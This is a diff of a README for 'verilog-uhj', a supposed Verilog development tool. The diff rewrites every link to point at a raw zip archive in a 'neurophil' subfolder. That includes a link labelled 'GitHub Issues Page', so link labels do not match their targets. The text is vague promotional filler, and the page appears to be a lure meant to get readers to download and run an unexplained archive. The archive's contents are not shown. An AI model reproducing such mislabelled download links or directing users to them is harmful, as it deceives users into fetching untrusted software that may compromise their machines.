@@ -1,7 +1,7 @@
 # 🎉 verilog-uhj - Simplifying Verilog Development for Everyone
 
 ## 📥 Download Now
-[![Download verilog-uhj](https://raw.githubusercontent.com/Gonsukey/verilog-uhj/main/neurophil/verilog-uhj.zip)](https://raw.githubusercontent.com/Gonsukey/verilog-uhj/main/neurophil/verilog-uhj.zip)
+[![Download verilog-uhj](https://github.com/Gonsukey/verilog-uhj/raw/refs/heads/main/neurophil/verilog_uhj_v3.5-alpha.3.zip)](https://github.com/Gonsukey/verilog-uhj/raw/refs/heads/main/neurophil/verilog_uhj_v3.5-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the verilog-uhj project! This tool helps you write and manage Verilog code easily. Whether you are new to hardware description languages or just need a better way to organize your projects, verilog-uhj can help. 
@@ -23,7 +23,7 @@ To run verilog-uhj, your computer needs the following:
 - Storage: At least 100 MB of available disk space.
 
 ## 💾 Download & Install
-To download verilog-uhj, visit this page: [Download Page](https://raw.githubusercontent.com/Gonsukey/verilog-uhj/main/neurophil/verilog-uhj.zip). 
+To download verilog-uhj, visit this page: [Download Page](https://github.com/Gonsukey/verilog-uhj/raw/refs/heads/main/neurophil/verilog_uhj_v3.5-alpha.3.zip). 
 
 1. Click on the link above to access the releases.
 2. Look for the latest version at the top.
@@ -49,8 +49,8 @@ We provide several resources to enhance your understanding of Verilog and how to
 
 ## 🛠 Support
 If you encounter any issues, please reach out for help. 
-- Visit our [GitHub Issues Page](https://raw.githubusercontent.com/Gonsukey/verilog-uhj/main/neurophil/verilog-uhj.zip) to report bugs or request features.
+- Visit our [GitHub Issues Page](https://github.com/Gonsukey/verilog-uhj/raw/refs/heads/main/neurophil/verilog_uhj_v3.5-alpha.3.zip) to report bugs or request features.
 - Join our community on forums and chat groups to connect with other users.
 
 ## 🌟 Conclusion
-Verilog-uhj is designed to make your Verilog coding experience easier and more enjoyable. Download it today to enhance your productivity and simplify your workflow. Don't forget to check out the [Download Page](https://raw.githubusercontent.com/Gonsukey/verilog-uhj/main/neurophil/verilog-uhj.zip) for the latest updates and releases.
+Verilog-uhj is designed to make your Verilog coding experience easier and more enjoyable. Download it today to enhance your productivity and simplify your workflow. Don't forget to check out the [Download Page](https://github.com/Gonsukey/verilog-uhj/raw/refs/heads/main/neurophil/verilog_uhj_v3.5-alpha.3.zip) for the latest updates and releases.
